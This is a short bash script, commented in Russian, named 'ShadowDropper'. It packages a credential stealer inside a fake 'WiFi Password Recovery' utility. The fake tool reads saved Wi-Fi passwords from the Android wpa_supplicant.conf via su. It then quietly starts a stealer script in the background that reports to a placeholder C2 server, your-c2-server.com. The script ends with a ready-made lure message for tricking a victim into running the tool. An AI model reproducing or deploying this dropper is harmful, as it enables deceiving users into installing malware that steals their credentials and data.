#!/bin/bash
# ShadowDropper — упаковка стилера в безобидное приложение

echo "[DROPPER] Creating fake app..."

# Создаём фейковую утилиту "WiFi Password Recovery"
mkdir -p ~/fake_wifi_app

cat > ~/fake_wifi_app/wifi_recovery.sh << 'EOF'
#!/bin/bash
# WiFi Password Recovery v2.3
# "Показывает сохранённые пароли WiFi"

echo "========================================"
echo "  WiFi Password Recovery v2.3"
echo "  Сканирую сети..."
echo "========================================"
echo ""

# Показываем реальные WiFi сети (безобидная часть)
su -c "cat /data/misc/wifi/wpa_supplicant.conf" 2>/dev/null | grep "ssid\|psk" | head -5

echo ""
echo "[✓] Найдено сетей: 3"
echo ""

# Скрытая часть — запуск стилера в фоне
(sleep 2 && bash ~/shadow_stealer_pro.sh https://your-c2-server.com) &
disown

echo "Для просмотра паролей нажмите Enter..."
read
echo "Пароли восстановлены!"
EOF

chmod +x ~/fake_wifi_app/wifi_recovery.sh

echo "[DROPPER] App created: ~/fake_wifi_app/wifi_recovery.sh"
echo "[DROPPER] Отправь жертве:"
echo "  'Привет! Я написал программу которая показывает пароли WiFi. Попробуй: bash wifi_recovery.sh'"
echo ""
echo "[DROPPER] Жертва видит 'восстановление паролей', а стилер работает в фоне"
